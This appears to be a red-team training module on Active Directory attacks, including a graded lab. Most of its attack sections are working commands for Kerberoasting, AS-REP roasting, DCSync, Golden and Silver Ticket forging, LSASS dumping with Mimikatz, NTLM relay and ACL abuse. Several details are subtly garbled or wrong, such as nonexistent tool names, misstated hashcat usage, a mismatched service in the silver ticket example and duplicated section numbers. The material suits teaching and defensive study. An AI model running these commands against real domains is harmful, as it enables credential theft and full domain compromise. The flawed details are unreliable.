# Module 10: Active Directory Attacks

## Objectives
- Understand Active Directory architecture and attack surface
- Enumerate domain environments using BloodHound and Impacket
- Perform Kerberos attacks (Golden Ticket, Silver Ticket, DCSync, Kerberoasting)
- Exploit domain trust relationships
- Understand AD defense and detection strategies

---

## 10.1 Active Directory Fundamentals

Active Directory (AD) is the backbone of Windows enterprise environments. It provides centralized identity management, authentication, and policy enforcement. Understanding AD architecture is essential for red teaming because compromising AD often means compromising the entire organization.

### Core AD Components

| Component | Purpose | Attack Relevance |
|-----------|---------|------------------|
| **Domain Controller (DC)** | Hosts AD DS, authenticates users, applies policies | Highest-value target — compromise = domain compromise |
| **Domain** | Security boundary with shared directory database | Everything in the domain shares the same security context |
| **Forest** | Collection of domains sharing a schema and trust relationship | Lateral movement across domains possible via trusts |
| **Organizational Unit (OU)** | Container for grouping objects, applies GPOs | GPO misconfigurations can lead to privilege escalation |
| **User accounts** | Identity with credentials | Password attacks, lateral movement, privilege escalation |
| **Computer accounts** | Machine identity with its own password | Can be exploited if compromised |
| **Service accounts** | Non-human accounts for services | Often have high privileges and weak passwords (Kerberoastable) |
| **Group Policy Objects (GPO)** | Centralized configuration management | Misconfigured GPOs can lead to domain escalation |
| **Domain trusts** | Relationships allowing cross-domain authentication | Can be exploited for lateral movement |

### Authentication in AD

- **NTLM:** Legacy challenge-response protocol. Still widely used. Vulnerable to relay attacks.
- **Kerberos:** Modern ticket-based protocol. More secure but has its own attack surface (Golden/Silver tickets, Kerberoasting, DCSync).
- **LDAPS:** LDAP over SSL/TLS for directory queries.

---

## 10.2 Domain Enumeration

### BloodHound

BloodHound uses graph theory to reveal hidden relationships and exploitable paths in AD environments. It's one of the most powerful AD enumeration tools available.

```bash
# Start BloodHound (includes Neo4j and BloodHound app)
sudo apt install bloodhound neo4j
# Or use the bloodhound-community Docker image
docker run --rm -p 7474:7474 -p 7687:7687 --env ACCEPT_LICENSE=true bloodhoundcommunity/bloodhound

# Collect data from the domain
# With SharpHound (Windows)
# Download from: https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe -c All

# With PyHound or the Python collector (Kali)
pip install pybloodhound
# Or use Impacket's bloodhound.py
bloodhound.py -u administrator -p 'P@ssw0rd1' -d corp.local -c All 10.10.1.100

# Load data into BloodHound
# Open BloodHound UI, upload the zip file from SharpHound collection
```

**BloodHound Queries to Run:**
- Find all paths from your user to Domain Admins
- Find users with admin rights to computers
- Find unrolled accounts (password never expires)
- Find users with spots (normally not delegated but can be)
- Find all machines where the current user has local admin rights
- Find AS-REP roasting candidates (users without pre-auth)
- Shortest path to Domain Admins from owned principals

### Impacket AD Enumeration

```bash
# GetNPUsers — find AS-REP roasting candidates
GetNPUsers.py corp.local -no-pass -usersfile users.txt

# GetUserSPNs — Kerberoastable accounts
GetUserSPNs.py corp.local/username:password -request -outputfile tickets.txt

# GetADUsers — enumerate domain users
GetADUsers.py corp.local -all -export

# Enum4linux-ng — SMB/LDAP enumeration
enum4linux-ng -A 10.10.1.100

# Rpcclient — RPC enumeration
rpcclient -U "" -N 10.10.1.100
# Commands once connected:
#   querydominfo
#   enumdomusers
#   enumdomgroups
#   queryuser <RID>

# LDAP search
ldapsearch -x -H ldap://10.10.1.100 -b "dc=corp,dc=local" "(objectClass=*)" *
```

### PowerView (PowerShell AD Enumeration)
PowerView is part of PowerSploit and provides powerful AD enumeration from a Windows host.

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainSID
Get-DomainPolicy

# Users
Get-DomainUser | Select-Object Name, SamAccountName, MemberOf, whenCreated
Get-DomainUser -SPN | Select-Object Name, ServicePrincipalName  # Kerberoastable
Get-DomainUser -Unconstrained    # Unconstrained delegation
Get-DomainUser -AdminCount      # Admin count users

# Computers
Get-DomainComputer | Select-Object Name, OperatingSystem, LastLogonDate
Get-DomainComputer -Unconstrained    # Unconstrained delegation
Get-DomainComputer -TrustedToAuth   # Trusted to authenticate

# Groups
Get-DomainGroup -Name "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"

# GPOs
Get-DomainGPO
Get-DomainGPO -ComputerIdentity <computer>  # GPOs applied to a computer
Get-DomainGPO -UserIdentity <user>          # GPOs applied to a user

# ACLs and permissions
Get-DomainUser -Identity <user> | Get-DomainObjectAcl
Find-InterestingDomainAcl
```

---

## 10.3 Kerberos Attacks

Kerberos is the default authentication protocol in AD. Several techniques target Kerberos specifically.

### Kerberoasting

Request service tickets (TGS) for accounts with Service Principal Names (SPNs), then crack them offline. Service accounts often have weaker passwords than user accounts.

```bash
# With Impacket
GetUserSPNs.py corp.local/username:password -request -outputfile kerb_tickets.txt

# Crack with hashcat
hashcat -m 13100 kerb_tickets.txt rockyou.txt
hashcat -m 13100 kerb_tickets.txt best64.rule

# With Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerb.txt
Rubeus.exe kerberoast /user:svc_backup /outfile:svc_backup.txt

# With PowerView
Invoke-Kerberoast -OutputFormat HCCA | Select-Object -ExpandProperty Hash | Out-File -Encoding ascii kerb_hashes.txt
```

**Why Kerberoasting works:**
- Any domain user can request a TGS for any SPN
- The TGS is encrypted with the service account's password hash
- If the service account has a weak password, the TGS can be cracked offline
- No authentication to the DC is required beyond a valid domain user account

### AS-REP Roasting

Attack accounts that have "Do not require Kerberos preauthentication" enabled. These accounts can be attacked without knowing their password.

```bash
# Find and attack AS-REP roastable accounts
GetNPUsers.py corp.local -no-pass -usersfile users.txt -outputfile asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt rockyou.txt

# With Rubeus
Rubeus.exe asreproast /outfile:asrep.txt
```

### Golden Ticket

Create a fake TGT (Ticket Granting Ticket) using the krbtgt account's NT hash. This allows creating tickets for any user with any privileges.

```bash
# With Mimikatz (requires krbtgt hash, usually from DCSync)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<nt_hash> /ptt" "exit"

# With tickey (Linux, if you have root on a DC)
./tickey -d corp.local -s S-1-5-21-... -krbtgt <nt_hash> -u Administrator
```

**Golden Ticket powers:**
- Access any resource in the domain
- Create tickets for any user (including non-existent users)
- Ticket valid for 10 years by default (configurable)
- Requires krbtgt hash — steal via DCSync or memory dumping on DC

### Silver Ticket

Create a fake service ticket for a specific service (e.g., MSSQL, IIS). Less powerful than Golden Ticket but harder to detect because it doesn't touch the DC.

```bash
# Silver ticket for MSSQL service
mimikatz.exe "kerberos::golden /user:attacker /domain:corp.local /sid:S-1-5-21-... /target:mssql.corp.local /service:CIFS /rc4:<nt_hash> /ptt" "exit"

# Silver ticket for IIS
mimikatz.exe "kerberos::golden /user:attacker /domain:corp.local /sid:S-1-5-21-... /target:iis.corp.local /service:host /rc4:<nt_hash> /ptt" "exit"
```

**Silver Ticket powers:**
- Access a specific service as any user
- No DC interaction — harder to detect
- Requires service account's NT hash, not krbtgt
- Limited to the specific service targeted

### DCSync

DCSync simulates a domain controller requesting password hashes from another DC. This allows stealing hashes without actually compromising a DC.

```bash
# With Mimikatz (requires Domain Admin or equivalent privileges)
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
mimikatz.exe "lsadump::dcsync /domain:corp.local" "exit"

# With secretsdump.py (Impacket)
secretsdump.py corp.local/Administrator:password@10.10.1.100 -just-dc
secretsdump.py -no-pass -k dc.corp.local  # If you have tickets

# DCSync requires:
# - DS-Replication-Get-Changes-All extended right
# - Typically held by Domain Admins, Enterprise Admins, and Domain Controllers
```

**Why DCSync is dangerous:**
- Steals hashes without injecting code on the DC
- Mimics legitimate replication traffic
- Can extract krbtgt hash for Golden Tickets
- Can extract any user's hash

---

## 10.4 NTLM Attacks

### NTLM Relay

Intercept NTLM authentication and relay it to another target. This can lead to authentication as the relayed user without knowing their password.

```bash
# With ntlmrelayx (Impacket)
ntlmrelayx.py -tf targets.txt -smb2support

# targets.txt contains target hosts to relay to
# When a victim authenticates to your listener, ntlmrelayx forwards auth to the target

# Common relay targets:
# - LDAP (escalate to Domain Admin by modifying ACEs)
# - SMB (access file shares, remote execution)
# - HTTP (web app authentication bypass)

# With Responder (LLMNR/NBT-NS poisoning + relay)
Responder.py -I eth0 -rP  # Poison and relay
```

**NTLM Relay requires:**
- LLMNR/NBT-NS poison or MitM position
- Victim auto-authenticates to attacker (e.g., accessing a fake share or HTTP resource)
- Target system accepts NTLM authentication from the relayed connection
- SMB signing disabled on target (for SMB relay)

### NTLM Cred Dumping

```bash
# From LSASS (Mimikatz)
mimikatz.exe "sekurlsa::logonpasswords" "exit"

# From SAM (local accounts)
samdump2 SYSTEM SAM > hashes.txt

# From LSA secrets
mimikatz.exe "lsadump::secrets" "exit"
```

---

## 10.5 AD Privilege Escalation Paths

### GPO Exploitation

Misconfigured GPOs can grant unintended privileges to users or computers.

```powershell
# Find GPOs with interesting permissions
Get-DomainGPO -Recurse | Get-DomainObjectAcl | Where-Object { $_.ActiveDirectoryRights -match "Write" }

# Find computers where a user has local admin via GPO
Find-GPOComputerAdmin -UserIdentity <user>

# Exploit: modify a GPO to run a script at logon/startup
# 1. Find a GPO you can modify
Get-DomainGPO -Writable
# 2. Edit the GPO to add a startup script or scheduled task
# 3. Wait for the GPO to apply to target computers
```

### ACL Abuse

Misconfigured Access Control Lists can grant unintended permissions.

```powershell
# Find modifiable domain objects
Get-DomainObject -ACL | Where-Object { $_.ActiveDirectoryRights -match "Write" }

# Find delegated admin rights
Find-InterestingDomainAcl

# Delegate control over a user or group
Add-DomainObjectAcl -TargetUserName <user> -PrincipalSid <attacker_sid> -Rights All
# Now attacker can modify that user's attributes, reset password, etc.

# GenericAll on a group — can add yourself to the group
Add-DomainGroupMember -Identity <group> -Members <attacker_user>
```

### Unconstrained Delegation

If a computer account is configured for unconstrained delegation, it can impersonate any user who authenticates to it. If you compromise that computer, you can capture credentials of high-value users who connect to it.

```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# To exploit:
# 1. Compromise the delegation-enabled computer
# 2. Trigger an admin to authenticate to it (by creating a fake SMB share, for example*)
# 3. Capture their TGT and use it for lateral movement

# * With Rubeus + Covelerant (or similar techniques)
```

### DSRM password reuse
The Directory Services Restore Mode (DSRM) password on DCs is sometimes reused across systems. If you obtain it, you can authenticate to DCs with the "DSRM" local admin account.

```bash
# Check if DSRM password is known (common default or leaked)
# Connect via psexec or similar using "Administrator" and DSRM password on the DC
```

---

## 10.6 AD Defense Awareness

Understanding how AD attacks are detected helps you choose techniques and provide better recommendations.

### Detection Points

| Attack | Detection Method |
|--------|-----------------|
| **Kerberoasting** | Event ID 4769 (TGS request) with unusual encryption types or high volume |
| **AS-REP roasting** | Event ID 4768 (TGT request) without pre-authentication |
| **DCSync** | Event ID 4662 (object access) with DS-Replication operation |
| **Golden/Silver Ticket** | Event ID 4769/4768 with unusual ticket characteristics; krbtgt hash change alerts |
| **NTLM Relay** | Event ID 4776 (NTLM authentication); network monitoring for NTLM to unusual targets |
| **BloodHound collection** | Large LDAP query volume; SharpHound beacon detection |
| **ACL modification** | Event ID 5136 (directory service object modified) |
| **GPO modification** | Event ID 5136 (GPO changed); Event ID 5141 (GPO deleted) |

### Defensive Controls

- **Tier 0 architecture:** Separate DCs and administrative accounts from the rest of the network
- **Protected Users group:** Prevents NTLM, Kerberos ticket caching, and other credential storage
- **LAPS (Local Administrator Password Solution):** Unique local admin passwords per machine
- **Audit Policy:** Enable advanced audit policy for directory service changes, logon events, etc.
- **SMB signing:** Prevents NTLM relay to SMB
- **LDAPS requirement:** Force LDAP over SSL
- **Monitoring and alerting:** SIEM with AD-specific detection rules

---

## 10.4 Lab: Active Directory Attacks

### Setup
- Kali Linux (10.10.1.10)
- Windows Server 2019 DC (10.10.1.100) — corp.local domain
- Windows 10 Client (10.10.1.101) — domain-joined
- BloodHound installed on Kali
- Impacket tools installed

### Prerequisites
Before starting, ensure the following lab configuration exists (set up by instructor or prior module):
- At least 5 domain users including a service account with a weak password
- At least one account without Kerberos pre-authentication (for AS-REP roasting)
- A computer configured for unconstrained delegation (or simulate the concept)
- Domain Admin group with at least 2 members

### Tasks

**Task 1: AD Enumeration with BloodHound**
1. Collect AD data using SharpHound (on Windows 10 client) or bloodhound.py (from Kali):
   ```bash
   bloodhound.py -u labuser -p Password123 -d corp.local -c All 10.10.1.100
   ```
2. Load the collected data into BloodHound UI
3. Run the following queries:
   - Shortest path from your user to Domain Admins
   - All users with admin rights on computers
   - Unrolled accounts (password never expires)
   - Kerberoastable accounts
   - AS-REP roasting candidates
4. Document the graph, paths, and findings. What attack paths exist?

**Task 2: Domain Enumeration with Impacket and Command Line**
1. Enumerate users:
   ```bash
   GetADUsers.py corp.local/labuser:Password123 -all -export
   ```
2. Enumerate computers:
   ```bash
   GetADComputers.py corp.local/labuser:Password123 -all
   ```
3. Enumerate groups:
   ```bash
   GetADGroups.py corp.local/labuser:Password123 -all
   ```
4. Check for AS-REP roasting candidates:
   ```bash
   GetNPUsers.py corp.local/labuser:Password123 -no-pass -usersfile all_users.txt
   ```
5. Document all findings in a structured report

**Task 3: Kerberoasting**
1. Identify Kerberoastable accounts from BloodHound or Impacket
2. Request tickets for 2–3 service accounts:
   ```bash
   GetUserSPNs.py corp.local/labuser:Password123 -request -outputfile kerb.txt
   ```
3. Crack the tickets with Hashcat:
   ```bash
   hashcat -m 13100 kerb.txt rockyou.txt
   ```
4. If cracking succeeds, use the recovered credentials to authenticate to other systems or services
5. If cracking fails, set up a service account with a weak password and repeat
6. Document the Kerberoasting attack chain — what was requested, what was cracked, what access was gained

**Task 4: AS-REP Roasting**
1. Identify AS-REP roastable accounts:
   ```bash
   GetNPUsers.py corp.local/labuser:Password123 -no-pass
   ```
2. Request AS-REP tickets for candidate accounts
3. Crack with hashcat:
   ```bash
   hashcat -m 18200 asrep.txt rockyou.txt
   ```
4. Document the process and results

**Task 5: DCSync Simulation**
*Note: DCSync requires Domain Admin or equivalent privileges. In a lab, use the Domain Admin credentials provided.*
1. Run DCSync to extract the krbtgt hash:
   ```bash
   secretsdump.py corp.local/Administrator:Password123@10.10.1.100 -just-dc
   ```
2. Extract a user hash:
   ```bash
   secretsdump.py corp.local/Administrator:Password123@10.10.1.100 -just-dc-user <username>
   ```
3. Analyze the output — what hashes were obtained, what could they be used for?
4. Use the krbtgt hash to create a Golden Ticket:
   ```bash
   mimikatz.exe "kerberos::golden /user:Hacker /domain:corp.local /sid:<domain_sid> /krbtgt:<nt_hash> /ptt" "exit"
   ```
5. Verify the Golden Ticket works by accessing a resource or listing domain info
6. Document the entire DCSync + Golden Ticket attack chain

**Task 6: NTLM Relay (Simulated)**
*Note: Full NTLM relay requires LLMNR/NBT-NS poisoning and a victim to authenticate. In a lab setup, this may be simulated rather than fully executed.*
1. Review how NTLM relay works conceptually
2. Review the conditions needed for successful relay:
   - LLMNR/NBT-NS poisoning
   - SMB signing disabled on target
   - Victim auto-authenticates
3. If the lab environment supports it, execute a relay attack with ntlmrelayx
4. If not, document the attack flow, conditions, and what would be required

**Task 7: AD Privilege Escalation via ACL or GPO**
1. Use PowerView or BloodHound to find an ACL or GPO misconfiguration you can exploit
2. If one exists in the lab, exploit it to gain additional privileges
3. If no misconfiguration exists, set up one on a test system:
   - Delegate GenericAll on a user to your user
   - Modify the user's password or add yourself to a privileged group
4. Document the escalation path

**Task 8: AD Attack Chain Documentation**
Compose a complete attack chain from initial foothold to Domain Admin:
1. Start with a low-privileged domain user
2. Enumerate the domain
3. Kerberoast or AS-REP roast to get credentials
4. Use credentials for lateral movement
5. Escalate privileges (ACL abuse, GPO abuse, etc.)
6. DCSync to get krbtgt
7. Golden Ticket for persistent domain access
8. Document each step with commands and findings

---

## 10.5 Expected Outcomes

By the end of this module, you should be able to:
- Enumerate Active Directory environments using BloodHound, Impacket, and PowerShell
- Perform Kerberoasting and AS-REP roasting attacks
- Execute DCSync to extract domain hashes
- Create Golden and Silver Tickets
- Understand NTLM relay concepts and conditions
- Identify AD privilege escalation paths (ACL abuse, GPO abuse, delegation abuse)
- Understand AD defense and detection strategies

---

## 10.6 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| AD enumeration | 10 | Comprehensive domain enumeration using multiple tools |
| BloodHound analysis | 10 | Collects data, runs queries, identifies attack paths |
| Kerberos attacks | 15 | Kerberoasting and/or AS-REP roasting executed successfully |
| DCSync / Golden Ticket | 10 | Extracts hashes or creates Golden Ticket |
| NTLM relay understanding | 5 | Explains attack chain and conditions |
| ACL/GPO escalation | 5 | Identifies and exploits an AD escalation path |
| Attack chain documentation | 10 | Complete documented attack chain from foothold to DA |
| **Total** | **65** | |

**Pass threshold:** 45/65 (69%)

### Report Requirements (5–6 pages)
1. AD environment overview — domain structure, users, computers, groups
2. BloodHound analysis — graphs, attack paths, key findings
3. Kerberos attacks — Kerberoasting and/or AS-REP roasting steps and results
4. DCSync/Golden Ticket — extraction, ticket creation, verification
5. Complete attack chain — step-by-step from initial access to Domain Admin
6. Detection and defense recommendations — what would detect each step, what controls would prevent it
